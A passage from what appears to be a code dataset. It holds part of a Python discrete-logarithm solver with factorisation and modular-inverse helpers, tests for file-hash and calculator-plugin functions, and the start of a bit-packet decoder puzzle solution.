n\t\t\t\t#O(1)\n\t\t\tstatus=True\t\t\t#O(1)\n\t\t\tbreak\t\t\t\t#O(1)\n\t\telif pow(g,n,p) == -1:\t\t#O(2)\t#Worst: O(6)\n\t\t\tx = 2 * n\t\t\t#O(1)\n\t\t\tstatus=True\t\t\t#O(1)\n\t\t\tbreak\t\t\t\t#O(1)\n\t\tn = n + 1\t\t\t\t#O(1)\n\n\tif x==0:\t\t\t\t\t#O(1)\n\t\tx=\"No exponent found\"\t\t\t#O(1)\n\t\tstatus=False\t\t\t\t#O(1)\n\n\treturn x, status\n\ndef a_exp_x_eq_r(a,p,r):\n\t#print(\"Running a_exp_x_eq_r(\"+str(a)+\", \"+str(p)+\", \"+str(r)+\"..)\"\n\tx=1\n\tx_values=[]\n\tcount=0\n\tdiff=0\n\tfor x in range(0,2*p):\n\t\t#print(\"count is: \"+str(count)\t\t\n\t\tif pow(a,x,p) == r:\n\t\t\t#print(\"a**x % p is: \"+str(r)\n\t\t\tx_values.append(x)\n\t\t\t#print str(x)+\" appended to x_values\"\n\t\t\tcount=count+1\n\t\t\tif count==2:\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#print str(x)+\" appended to x_values\n\t\t\t\tdiff = x_values[1] - x_values[0]\t\t\t\t\n\t\t\t\t#print(\"diff is: \"+str(diff)\n\t\t\t\tbreak\n\t\t#x = x + 1\n\treturn diff\n\ndef prop_234(g, h, qi, ei, p, count_xi_not_found, count_calc_xi_status_false, lhs):\n\t#print(\"-----------------------------------\"\n\t#print(\"Running prop_234(\"+str(g)+\", \"+str(h)+\", \"+str(qi)+\", \"+str(ei)+\", \"+str(p)+\"..) to solve for x...\"\n\t\n\t#g[var], h[var], qi[var], ei[var], p\n\t#let x = x_0 +x_1*(q)+x_2*(q**2)+...+x_{e-1}q^(e-1), with 0 <= x_i < q, and determine successively x_0, x_1, x_2, ...\n\n\t#print(\"qi is: \"+str(qi)\n\t#print(\"ei is: \"+str(ei)\n\n\t# constuct list of q_powers from 0 to e-1\n\tq_powers=[]\t\t\t\t\t\t#O(1)\n\n\t#when ei > 0: #worst: O(n+3)\t#best: O(3)\n\t#when ei = 0: O(3)\t\n\t#when ei not > 0 nor = 0: O(4)\n\n\t#first q_power will always be 1 (for k=0)\n\tif ei > 0:\t\t\t\t\t\t#O(1)\t#worst: O(n+3)\t#best: O(1)\n\t\tfor k in range(0,ei):\t\t\t\t\t#O(n)\n\t\t\tq_powers.append(pow(qi,k))\t\t\t#O(2)\n\t\t\t#q_powers.append(qi**k)\n\telif ei==0:\t\t\t\t\t\t#O(1)\t#worst: O(3)\n\t\tprint(\"ei = 0!\")\t\t\t\t\t\n\t\tsys.exit()\t\t\t\t\t#O(1)\n\n\telse:\t\t\t\t\t\t\t#O(1)\t#worst: O(4)\n\t\tprint(\"ei is: \",str(ei))\n\t\tsys.exit()\t\t\t\t\t#O(1)\n\n\t#print(\"q_powers are: \"+str(q_powers)\n\n\t#now want to calculate xi using function\t\n\tresult = calc_xi(q_powers, g, p, h, qi, ei, lhs)\n\t#return xi, calc_xi_status, xi_found\t\n\txi = result[0]\n\tcalc_xi_status = result[1]\n\txi_found = result[2]\n\n\t#Subtotal - Worst: O(n**2 + 7n + 3), Best: O(3) when calc_xi_status == False\n\tif calc_xi_status == False:\n\t\tcount_calc_xi_status_false = count_calc_xi_status_false + 1\n\t\t#print(\"Calc_xi_status is false! - g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", qi: \"+str(qi)+\", ei: \"+str(ei)\n\t\tx=0 \t\t\t\t\t\t#O(1)\n\t\tM=0\t\t\t\t\t\t#O(1)\n\t\t#input(\"Calc_xi method failed (lhs=rhs=1). Waiting for user..\")\n\telif xi_found == False:\t\t\t\t#O(1)\n\t\tcount_xi_not_found = count_xi_not_found + 1\n\t\t#print(\"An xi was not found! - g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", qi: \"+str(qi)+\", ei: \"+str(ei)\n\t\tx=0 \t\t\t\t\t\t#O(1)\n\t\tM=0\t\t\t\t\t\t#O(1)\n\t\t#input(\"Calc_xi method failed (lhs=rhs=1). Waiting for user..\")\n\telif calc_xi_status == True and xi_found == True:\t\t#O(1)\t#Subtotal - Worst: O(n**2 + 7n + 2), Best: O(n+5) when only 1 as q_power\n\t\t#print(\"xi are: \"+str(xi)\n\n\t\t#print(\"---------------------------\"\n\t\n\t\t#print(\"q_powers are: \"+str(q_powers)\t\n\t\tfor q_power in q_powers: \t\t\t#O(n)\t#Worst: O(n**2 + 7n)\t#Best: O(n+4) - when only 1 as q_power\n\t\t\t#print(\"q_power is: \"+str(q_power)\n\t\t\t#print(\"index of q_power is: \"+str(q_powers.index(q_power))\n\t\t\t#print(\"xi[(q_powers.index(q_power))] is: \"+str(xi[(q_powers.index(q_power))])\t\t\n\t\t\ta=xi[q_powers.index(q_power)] \t\t\t\t\t\t\t#O(n+1)\n\t\t\tif q_power==1: \t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Adding \"+str(xi[q_powers.index(q_power)])+\" to x\"\n\t\t\t\tx = a\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#x = xi[q_powers.index(q_power)]\n\t\t\t\n\t\t\telse:\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Adding \"+str(xi[(q_powers.index(q_power))])+\"*\"+str(q_power)+\" to x, and reducing mod \"+str(qi**ei)\n\t\t\t\tx = (x + a * q_power) % pow(qi,ei)\t\t\t\t\t#O(4)\n\t\t\t\t#x = (x + xi[q_powers.index(q_power)]*q_power) % (pow(qi,ei))\t\n\t\t\t\n\t\tM = pow(qi,ei)\t\t\t\t\t#O(1)\n\t\t#print(\"x is: \"+str(x)+\" mod \"+str(M))\t\t\n\telse:\n\t\tprint(\"calc_xi_status is: \"+str(calc_xi_status))\n\t\tprint(\"xi_found are: \"+str(xi_found))\n\t\tinput(\"Waiting for user..\")\n\n\treturn x, M, calc_xi_status, xi_found, count_xi_not_found, count_calc_xi_status_false\n\ndef calc_xi(q_powers, g, p, h, qi, ei, lhs):\n\t#print(\"---------------------------\"\t\t\t\n\t#print(\"Running calc_xi(\"+str(q_powers)+\", \"+str(g)+\", \"+str(h)+\", \"+str(qi)+\", \"+str(ei)+\", \"+str(p)+\") ..\"\t\t\t\t\n\n\t#initialise xi, cumul_q_powers, cumul_xi_q_powers\n\txi = len(q_powers) * [0]\t\t\t\t#O(len(q_powers))\n\tcumul_q_powers=[]\t\t\t\t\t#O(1)\n\tcumul_xi_q_powers=[]\t\t\t\t\t#O(1)\n\tcalc_xi_status=True\t\t\t\t\t#O(1)\n\n\t#Loop through each q_power until xi are calculated\n\tfor q_power in q_powers:\n\t\t#print(\"q_power is: \"+str(q_power)\t\t\n\t\tif calc_xi_status == True:\n\t\t\tif q_power==1:\t\t\t\t\t\t\t#total (incl top lev if) = \n\t\t\t\t#solving for x_0\t\t\n\t\t\t\t#print(\"---------------------------\")\t\t\t\n\t\t\t\txi_found = False\n\t\t\t\t#print(\"Solving for xi[0] ..\")\t\t\t\t\n\t\t\t\t#print(\"q_power is: \"+str(q_power))\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t#lhs= pow(g,pow(qi,ei-1),p)\t\t\t\t#O(2)\n\t\t\t\t#lhs= (g**qi**(ei-1)) % p\t\t\t\t\n\t\t\t\t#print(\"lhs is: \"+str(lhs)) \t\t# lhs=76\t\n\t\t\t\t\t\n\t\t\t\trhs= pow(h,pow(qi,ei-1),p)\t\t\t\t#O(2)\n\t\t\t\t#rhs= (h**qi**(ei-1)) % p\t\t\t\t\n\t\t\t\t#print(\"rhs is: \"+str(rhs)) \t\t# rhs=1\t\t\n\t\t\t\n\t\t\t\tif lhs ==1 and rhs ==1:\t\t\t\t\t#O(1)\t\t#subtotal: O(2)\t#section= O(2n+6)\t\t\t\t\n\t\t\t\t\t#This method seems to fail for this instance. Try p-1/q method?? brute force search instead??\t\t\t\t\n\t\t\t\t\tcalc_xi_status=False\t\t\t\t#O(1)\n\n\t\t\t\telse:\t\t\t\t\t\t\t#O(1)\t\t#Worst: O(4n+1)\t#best: O(6)\n\t\t\t\t\tfor t in range(0, qi):\t\t\t\t#O(n)\t\t#Worst: O(4n)\t#best: O(5)\n\t\t\t\t\t\tif pow(lhs,t,p) == rhs:\t\t\t#O(2)\t\t#Worst: O(4)\t#best: O(4)\n\t\t\t\t\t\t#if lhs**t % p ==rhs:\t\t\t\t\t\n\t\t\t\t\t\t\txi[0]=t  # xi[0]=\t\t#O(1)\n\t\t\t\t\t\t\txi_found = True\n\t\t\t\t\t\t\t#print(\"xi[0] is: \"+str(t)\t\n\t\t\t\t\t\t\tbreak\t\t\t\t\n\n\t\t\t\tif calc_xi_status == True:\t\t\t\t#O(1)\t\t#subtotal= O(3)\n\t\t\t\t\tcumul_xi_q_powers.append(xi[0])\t\t\t#O(1)\n\t\t\t\t\tcumul_q_powers.append(1)\t\t\t#O(1)\n\t\t\t\t\t#print(\"cumul_xi_q_powers after append: \"+str(cumul_xi_q_powers)\n\t\t\t\t\t#print(\"cumul_q_powers after append: \"+str(cumul_q_powers)\n\t\t\telse:\t\t\t\t\t\t\t\t#O(1)\t\t#total (incl top lev if) = \n\t\t\t\t#solving for x_n (n!=0)\n\t\t\t\t#print(\"---------------------------\")\t\t\t\n\t\t\t\txi_found = False\n\t\t\t\t#print(\"solving for x_n (n!=0)..\"\t\t\t\n\t\t\t\t#print(\"q_power is: \"+str(q_power))\t\t\t\n\t\t\t\txi_number = q_powers.index(q_power)\t\t\t#O(n)\n\t\t\t\t#print(\"Solving for xi[\"+str(xi_number)+\"] ..\")\n\t\t\t\t#print(\"cumul_xi_q_powers before append: \"+str(cumul_xi_q_powers)\n\t\t\t\t#print(\"cumul_q_powers before append: \"+str(cumul_q_powers)\n\t\t\t\n\t\t\t\t#print(\"g is: \"+str(g) # g=\n\t\t\t\t#print(\"h is: \"+str(h) # h=\n\t\t\t\ta = xi_number-1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"xi[\"+str(a)+\"] is: \"+str(xi[a])) # xi[0]=0\t\n\t\t\t\n\t\t\t\t#print(\"qi is: \"+str(qi))\t#qi = \n\t\t\t\t#print(\"ei is: \"+str(ei))\t#ei = \n\t\t\t\n\t\t\t\t#print(\"cumul_xi_q_powers is: \"+str(cumul_xi_q_powers)\t\n\t\t\t\t#print(\"cumul_q_powers is: \"+str(cumul_q_powers)\t\t\n\t\t\t\n\t\t\t\tz=0\n\t\t\t\tfor cumul_xi_q_power in cumul_xi_q_powers:\t\t#O(n+1)\n\t\t\t\t\tz = z + cumul_xi_q_power\n\t\t\t\t\n\t\t\t\t#print(\"sum_cumul_xi_q_power is now: \"+str(z)\t\t\n\n\t\t\t\tif xi[xi_number-1] >= 0:\n\t\t\t\t\t#need to work out what g**-[x_0+x_1*q_power+x_2*q_power**2 + ...], mod p is!!!\n\t\t\t\t\t#print(\"xi[\"+str(xi_number-1)+\"] >= 0\")\n\t\t\t\t\t#print(\"Calculating modular inverse of \"+str(g)+\"**\"+str(-z)+\", mod \"+str(p))\t\t\t\n\t\t\t\t\t#print(\"Calculating modular inverse of \"+str(g)+\"**\"+str(-xi[xi_number-1])+\", mod \"+str(p))\t\t\t\t\n\t\t\t\t\tb = calc_modinverse(g, z, p)\t\t\t\t\t\t\t\t\t#O(n+5)\n\t\t\t\t\t#b = calc_modinverse(g, xi[xi_number-1], p) #b = \n\t\t\t\t\t#print(\"inverse is: \"+str(b)) #b = \t\t\t\t\t\t\t\t\n\t\t\t\t\n\t\t\t\t\t#(ei - xi_number - 1)\n\n\t\t\t\t\t#print(\"(h * b)**qi**(ei - xi_number - 1) % p is: \"+str((h * b)**qi**(ei - xi_number - 1) % p)\n\t\t\t\t\trhs = pow(h * b,pow(qi,ei - xi_number - 1),p)\n\t\t\t\t\t#rhs = (h * b)**qi**(ei - xi_number - 1) % p\t\t\t\t\t\t#O(2n+2)\t\t\t\n\n\t\t\t\t\t#print(\"rhs is: \"+str(rhs))\t\t\t\t\t\t\t\t\n\n\t\t\t\t\tif lhs == 1 and rhs == 1:\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(4)\n\t\t\t\t\t\tprint(\"lhs == 1 and rhs == 1\")\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t#print(\"xi[\"+str(xi_number-1)+\"] >= 0, lhs=1, rhs=1, g: \"+str(g)+\" p: \"+str(p)+\" h: \"+str(h))\t\t\t\n\t\t\t\t\t\tcalc_xi_status=False\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\tprint(\"Calc_xi method failed. h is \"+str(h)+\", p is \"+str(p)+\", qi is \"+str(qi)+\", ei is \"+str(ei)+\", xi_number is \"+str(xi_number))\t\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\t\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(n**2+5n+1)\n\t\t\t\t\t\tfor t in range(0, qi):\t\t\t\t\t\t\t\t\t#O(n)\n\t\t\t\t\t\t\t#print(\"t is now: \"+str(t)\t\t\t\t\t\n\t\t\t\t\t\t\t#print(str(lhs)+\"**\"+str(t)+\" % \"+str(p)+\" is: \"+str(lhs**t % p))\n\t\t\t\t\t\t\tif lhs**t % p == rhs:\t\t\t\t\t\t\t\t#O(n+2)\n\t\t\t\t\t\t\t\txi[xi_number]=t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\t\t\txi_found = True\n\t\t\t\t\t\t\t\t#print(\"xi[\"+str(xi_number)+\"] is: \"+str(t)\t\t\t\t\t\n\t\t\t\t\t\t\t\tbreak\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t\t\t\t\tif calc_xi_status == True:\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(n**2+5n+1)\n\t\t\t\t\t\tcumul_xi_q_powers.append(q_power * xi[xi_number])\t\t\t\t\t\t#O(3)\n\t\t\t\t\t\t#print(\"Appended \"+str(q_power * xi_number)+\" to cumul_xi_q_powers\")\n\t\t\t\t\t\tcumul_q_powers.append(q_power)\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"Appended \"+str(q_power)+\" to cumul_q_powers\")\n\t\t\t\t\t\t#print(\"xi[\"+str(xi_number)+\"] is: \"+str(xi[xi_number]))\n\t\t\t\t\t\t#print(\"xi are now:\"+str(xi)\n\t\t\t\t\t\t#print(\"cumul_xi_q_powers after append: \"+str(cumul_xi_q_powers)\n\t\t\t\t\t\t#print(\"cumul_q_powers after append: \"+str(cumul_q_powers)\n\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\tprint(\"xi[\"+str(xi_number-1)+\"] is negative !!! CHECK\")\t\t\t\t\t\t\t\n\t\t\t\t\t#input(\"Waiting for user..\")\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\n\t\t\t\t#print(\"lhs is: \"+str(lhs)\n\t\t\t\t#print(\"rhs is: \"+str(rhs)\n\n\t\t\t\t#print(\"rhs is: \"+str(rhs))\n\t\t\t\t#print(\"qi is: \"+str(qi)\n\treturn xi, calc_xi_status, xi_found\n\ndef calc_modinverse(g, power, p):\n\t#print(\"----------------\"\n\t#print(\"Running calc_modinverse()..\"\t\t\t\t\t#O(1)\n\t#print(\"g is: \"+str(g)\n\t#print(\"power is: \"+str(power)\n\t\n\tfloor_sqrt_p = math.floor(math.sqrt(p))\t\t\t\t\t#O(2)\n\n\t#this only works for p being prime!\t\n\tif isprime(p) == True:\t\t\t\t\t\t\t#O(1)\t#Subtotal O(2n+4)\n\t#if isprime(p,floor_sqrt_p) == 0:\t\n\t\tresult=g**(p-2)% p\t\t\t\t\t\t#O(n+2)\t#Subtotal O(2n+3)\n\t\t#print str(g)+\"**(-1) mod \"+str(p)+\" is: \"+str(result)\n\t\tc = result**power % p\t\t\t\t\t\t#O(n+1)\n\t\t#print(\"c is: \"+str(c)\t\n\t\t#print str(g)+\"**(-\"+str(power)+\") mod \"+str(p)+\" is: \"+str(c)\n\telse:\n\t\t#p is not prime!\n\t\t#print(\"p: \"+str(p)+\" is not prime!\"\n\t\tc = modinv(g, p)\t\t\t\t\t\t#O(n)\n\t\t#return x % m\n\t\t#print(\"inverse is: \"+str(c)\t\t\n\n\t\t#input(\"Waiting for user..\")\t\n\treturn c\n\ndef calc_powers(factors):\n\t#Worst: O(n+13)\t#Best: O(18)\n\n\t#print(\"Running calc_powers..\"\n\t#Now want to find max powers m for each factor in factors.\n\t#can do this by counting unique factors\t\t\t\n\tprime_factors=[]\t\t\t\t\t#O(1)\n\tpowers = []\t\t\t\t\t\t#O(1)\n\tfac_list = []\t\t\t\t\t\t#O(1)\n\tcount = 0\t\t\t\t\t\t#O(1)\n\tc_primefactors_powers = 0\t\t\t\t#O(1)\n\ts_before_calc_powers = time.clock()\t\t\t#O(1)\n\tfor factor in factors:\t\t\t\t\t#O(n)\t#Worst: O(n**2 + 2n)\t#Best: O(???)\n\t\t#print(\"------------------\"\t\n\t\t#print(\"factor is: \"+str(factor)\t\t\n\t\tif fac_list:\t\t\t\t\t\t#O(1)\t#Worst: O(n+2)\t#Best: O(4)\n\t\t\t#temp factor list for comparisons has values\n\t\t\tif factor in fac_list:\t\t\t\t\t#O(n)\t#Worst: O(n+1)\t#Best: O(6)\n\t\t\t\t#print str(factor)+\" is in fac_list\"\n\t\t\t\tcount += 1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#temp_factor, temp_count = factor, count\n\t\t\t\t#print temp_factor, temp_count\n\t\t\telse:\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#factor is not in fac_list\n\t\t\t\t#add factor to prime_factors\n\t\t\t\tprime_factors.append(factor)\t\t\t\t#O(1)\n\t\t\t\t#print(\"Added \"+str(factor)+\" to prime_factors\"\n\t\t\t\t#print(\"prime_factors is: \"+str(prime_factors)\n\t\t\t\t#add current count to powers for previous factor\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\tpowers.append(count)\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Added \"+str(count)+\" to powers for previous factor\"\n\t\t\t\t#count = 0\n\t\t\t\t#print str(factor)+\" is NOT in fac_list\"\n\t\t\t\t#append it\t\t\t\t\n\t\t\t\tfac_list.append(factor)\t\t\t\t\t#O(1)\n\t\t\t\t#count += 1\n\t\t\t\tcount = 1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#print(\"fac_list is: \"+str(fac_list)\n\t\t\t\t\n\t\telse:\t\t\t\t\t\t\t\t#O(1)\t#Subtotal: O(4)\n\t\t\t#temp factor list for comparisons is empty\n\t\t\t#store 1st factor\n\t\t\t#print(\"fac_list is empty\"\n\t\t\tfac_list.append(factor)\t\t\t\t\t\t#O(1)\n\t\t\t#print str(factor)+\" added to fac_list\"\n\t\t\tprime_factors.append(factor)\t\t\t\t\t#O(1)\n\t\t\t#print(\"Added \"+str(factor)+\" to prime_factors\"\n\t\t\t#print(\"prime_factors is: \"+str(prime_factors)\t\t\t\n\t\t\tcount += 1\t\t\t\t\t\t\t#O(1)\n\t\t\t#print(\"count is: \"+str(count)\t\n\n\t#add count to powers for the last factor and the last factor\n\tpowers.append(count)\n\t#print(\"Added \"+str(count)+\" to powers for previous factor\"\n\t\n\t#print(\"prime_factors are: \"+str(prime_factors)\n\t#print(\"powers are: \"+str(powers)\n\n\tc_calc_powers = time.clock() - s_before_calc_powers\n\n\treturn prime_factors, powers, c_calc_powers\n\ndef csvfile_store_primes(csv_filename_var):\t\t### Assumming O(n+len(z1)+1) ### \n\t\t\n\twith open(csv_filename_var,'r') as csvfile:\n\t\t# Strip quotes, eol chars etc, and convert strings to integers\n\t\t#Use generator to get number of primes to use in prime file..\n\t\tz1=(int(x) for row in csv.reader(csvfile) for x in row)\t\t\t#O(n) - Potentially y rows and x items in each row, \n\t\t\t\t\t\t\t\t\t\t\t# however only 1 row in csvfile being used. Hence x*y=x items to store\n\t\tprimes=list(z1)\t\t\t\t\t\t\t\t#O(len(z1))\n\t\tcsvfile.close()\t\t\t\t\t\t\t\t#O(1 ???)\n\treturn primes\n\ndef factorise(N):\t\t\n\t#based on code on https://stackoverflow.com/questions/16996217/prime-factorization-list/\n\t#Author states this is is O(sqrt(n))) and 2 to 3 times faster than trial division in practice\n\t#Wheel factorization, which uses a cyclic set of gaps between potential primes to greatly\n\t#reduce the number of trial divisions.\n\t#uses a 2,3,5-wheel\n\n\t#print(\"Running factorise(\"+str(N)+\")..\"\t\n\n\t#Create lists to hold prime factors of N and corresponding powers\n\tfactors = []\t\t\t\t\t#O(1)\n\n\t#print(\"Calculating prime factors and powers\"\n\ts_before_factorisations = time.clock()\t\t\n\t\t\n\tgaps=[1,2,2,4,2,4,2,4,6,2,6]\t\t\t#O(1)\n\tlength, cycle = 11,3\t\t\t\t#O(1)\n\tf, factors, next = 2, [], 0\t\t\t#O(1)\n\twhile f*f <= N:\t\t\t\t\t#O(n)\n\t\twhile N % f == 0:\t\t\t\t#O(n)\n\t\t\t#f is a factor. Add factor f to fs\n\t\t\tfactors.append(f)\t\t\t\t#O(1)\n\t\t\tN /= f\t\t\t\t\t\t#O(1)\n\t\tf += gaps[next]\t\t\t\t#O(1)\n\t\tnext += 1\t\t\t\t#O(1)\n\t\tif next == length:\t\t\t#O(1)\n\t\t\tnext = cycle\t\t\t\t#O(1)\n\tif N > 1: factors.append(N)\n\t\t\n\tc_factorisations = time.clock() - s_before_factorisations\t#O(1)\n\n\treturn factors, c_factorisations\t\t#O(1)\n\ndef size_input_check(input_number):\n\n\t#if size of number >= 2*10^8 then return message about memory & exit\n\tif input_number>2*(10**8):\n\t\tprint('Number to attempt to factorise is too large for this program. Try a number <= 2x10^8. Exiting to avoid memory issues..')\n\t\tsys.exit()\n\nif __name__=='__main__':\n\tmain()\n\ndef egcd(a, b):\t\t\t\t\t\t\t#O(n)\n\t#print(\"Running egcd(\"+str(a)+\",\"+str(b)+\")\")\n\t#print(\"a is: \"+str(a)\n\t#print(\"b is: \"+str(b)\t\n\tif a == 0:\t\t\t\t\t\t#O(1)\t#Subtotal: O(2)\n\t\treturn (b, 0, a)\t\t\t\t#O(1)\n\tg, y, x = egcd(b % a, a)\t\t\t\t\n\t#print(\"egcd(\"+str(a)+\",\"+str(b)+\") is: \"+str(g)+\" \"+str(x - (b//a) * y)+\" \"+str(y))\n\treturn (g, x - (b//a) * y, y)\n\ndef modinv(a, m):\t\t\t\t\t\t#### O(n+5) ###\n\t#print(\"Running modinv(\"+str(a)+\",\"+str(m)+\")\")\t\t\n\t#print(\"a is: \"+str(a)\n\t#print(\"m is: \"+str(m)\t\n\t#egcd(a, m)\n\tg, x, y = egcd(a, m)\t\t\t\t\t#O(n)\n\tif g != 1:\t\t\t\t\t\t\t#O(1)\t#Subtotal: O(2)\n\t\traise Exception('No Modular Inverse') \t\t\t#O(1)\n\t#print(str(a)+\"**(-1) mod \"+str(m)+\" is: \"+str(x % m))\t\n\treturn x % m\t\t\t\t\t\t#O(1)\n\n", "439": "# -*- coding: utf-8 -*-\n\n# Copyright 2022 Adansons Inc.\n# Please contact engineer@adansons.co.jp\n\nimport os\nimport sys\n\nsys.path.append(os.path.dirname(os.path.dirname(__file__)))\n\nfrom base.hash import calc_file_hash\n\nPATH = os.path.join(os.path.dirname(__file__), \"data\", \"sample.jpeg\")\nMD5HASH = \"93304c750cf3dd4e8e91d374d60b9734\"\nSHA224HASH = \"c9462ddf27c8aefbf74f70ca13fd113f304e46d1359cde3f3aa8908a\"\nSHA256HASH = \"09e300d993f62d0e623e0d631a468e6126881b0e9152547ca8b369e7233e5717\"\nSHA384HASH = \"eb2e4a765e17f666122bb30f13a40e843fbfb32d6f6b3f96b5d8614c2761f3827ef5c374b5078c651d31ac549feed8f2\"\nSHA512HASH = \"c9414d9abf93f278457d9d31a0eef74a57644f7431aa9132a3ac5e7642b29a6b2f27976ff19700cca0bd9b902f8e4d5bfcfb4733b8b79e9b8c85d40fc796e7d6\"\nSHA1HASH = \"ec33c6e4dbe7a84f177899f6aac29bb718cb0451\"\n\n\ndef test_calc_file_hash_md5():\n    digest = calc_file_hash(PATH, algorithm=\"md5\", split_chunk=False)\n    assert digest == MD5HASH\n\n\ndef test_calc_file_hash_sha224():\n    digest = calc_file_hash(PATH, algorithm=\"sha224\", split_chunk=False)\n    assert digest == SHA224HASH\n\n\ndef test_calc_file_hash_sha256():\n    digest = calc_file_hash(PATH, algorithm=\"sha256\", split_chunk=False)\n    assert digest == SHA256HASH\n\n\ndef test_calc_file_hash_sha384():\n    digest = calc_file_hash(PATH, algorithm=\"sha384\", split_chunk=False)\n    assert digest == SHA384HASH\n\n\ndef test_calc_file_hash_sha512():\n    digest = calc_file_hash(PATH, algorithm=\"sha512\", split_chunk=False)\n    assert digest == SHA512HASH\n\n\ndef test_calc_file_hash_sha1():\n    digest = calc_file_hash(PATH, algorithm=\"sha1\", split_chunk=False)\n    assert digest == SHA1HASH\n\n\ndef test_split_chunk():\n    digest = calc_file_hash(PATH, algorithm=\"sha256\", split_chunk=True)\n    assert digest == SHA256HASH\n\n\nif __name__ == \"__main__\":\n    test_calc_file_hash_md5()\n    test_calc_file_hash_sha224()\n    test_calc_file_hash_sha256()\n    test_calc_file_hash_sha384()\n    test_calc_file_hash_sha512()\n    test_calc_file_hash_sha1()\n    test_split_chunk()\n", "440": "from symcalc.plugins.additions.external_links import AddExternalLinks\nfrom tests import TestCalculator\n\n\ndef test_plugin_external_links_instantiate():\n    AddExternalLinks()\n\n\ndef test_plugin_external_links_hook():\n    calc = TestCalculator()\n    plugin = AddExternalLinks()\n    calc.register_plugin(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_external_links_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin(AddExternalLinks())\n    assert calc.chksym(\"desmos\")\n    assert calc.chksym(\"symbolab\")\n    assert calc.chksym(\"wolframalpha\")\n    assert calc.chksym(\"sympygamma\")\n    assert callable(calc.getsym(\"desmos\"))\n    assert callable(calc.getsym(\"symbolab\"))\n    assert callable(calc.getsym(\"wolframalpha\"))\n    assert callable(calc.getsym(\"sympygamma\"))\n\n\ndef test_plugin_external_links_available():\n    calc = TestCalculator()\n    calc.register_plugin(AddExternalLinks())\n    assert callable(calc.command(\"desmos\"))\n    assert callable(calc.command(\"symbolab\"))\n    assert callable(calc.command(\"wolframalpha\"))\n    assert callable(calc.command(\"sympygamma\"))\n", "441": "#!/usr/bin/env python3\n\nimport pprint as pp\nimport heapq\n\ndef parse(input):\n    lines = [l.strip() for l in open(input)]\n    return lines\n\n\ndef disect(hex_val, num_bits, debug=False):\n    if debug: print(f'{num_bits = } {hex_val = :b}')\n\n    calc = 0\n\n    version = hex_val >> (num_bits-3)\n    hex_val -= (version << (num_bits-3))\n    num_bits -= 3\n    if debug: print(f'{version = }')\n    if debug: print(f'{num_bits = } {hex_val = :b}')\n    \n    typeID = hex_val >> (num_bits-3)\n    hex_val = hex_val - (typeID << (num_bits-3))\n    num_bits -= 3\n    if debug: print(f'{typeID = }')\n    if debug: print(f'{num_bits = } {hex_val = :b}')\n\n    ver_sum = version    \n    if typeID != 4:\n        lenID = hex_val >> (num_bits-1)\n        hex_val = hex_val - (lenID << (num_bits-1))\n        num_bits -= 1\n        if debug: print(f'{lenID = }')\n        if debug: print(f'{num_bits = } {hex_val = :b}')\n\n        calc_n = []\n        if lenID:\n            sub_len = hex_val >> (num_bits-11)\n            hex_val = hex_val - (sub_len << (num_bits-11))\n            num_bits -= 11\n            if debug: print(f'{sub_len = } {num_bits = } {hex_val = :b}')\n\n            while sub_len > 0:\n                ver_sum_n, num_bits_n, hex_val, calc_i = disect(hex_val, num_bits, debug)\n                calc_n.append(calc_i)\n                sub_len -= 1\n                ver_sum += ver_sum_n\n                num_bits = num_bits_n\n                if debug: print(f'{sub_len = } {ver_sum_n = } {num_bits_n = }')\n        else:\n            tot_len = hex_val >> (num_bits-15)\n            hex_val = hex_val - (tot_len << (num_bits-15))\n            num_bits -= 15\n            if debug: print(f'{tot_len = } {num_bits = } {hex_val = :b}')\n\n            while tot_len > 0:\n                ver_sum_n, num_bits_n, hex_val, calc_i = disect(hex_val, num_bits, debug)\n                calc_n.append(calc_i)\n                tot_len -= num_bits - num_bits_n\n                ver_sum += ver_sum_n\n                num_bits = num_bits_n\n                if debug: print(f'{ver_sum_n = } {num_bits_n = }')\n\n        if debug: print(f'before {typeID = } {calc = } {calc_n = }')\n        if typeID == 0:\n            calc = sum(calc_n)\n        if typeID == 1:\n            calc = 1\n            for c in calc_n:\n                calc *= c\n        if typeID == 2:\n            calc = min(calc_n)\n        if typeID == 3:\n            calc = max(calc_n)\n        if typeID == 5:\n            calc = 1 if calc_n[0] > calc_n[1] else 0\n        if typeID == 6:\n            calc = 1 if calc_n[0] < calc_n[1] else 0\n        if typeID == 7:\n            calc = 1 if calc_n[0] == calc_n[1] else 0\n        if debug: print(f'after  {typeID = } {calc = } {calc_n = }')\n\n    if typeID == 4:\n        number = 0\n        while (hex_val & 0x1 << (num_bits-1)) and num_bits >= 5:\n            num = hex_val >> (num_bits - 5)\n            number <<= 4\n            number += num & 0xF\n            hex_val -= num << (num_bits - 5)\n            num_bits -= 5\n\n        num = hex_val >> (num_bits - 5)\n        number <<= 4\n        number += num & 0xF\n        hex_val -= num << (num_bits - 5)\n        num_bits -= 5\n        if debug: 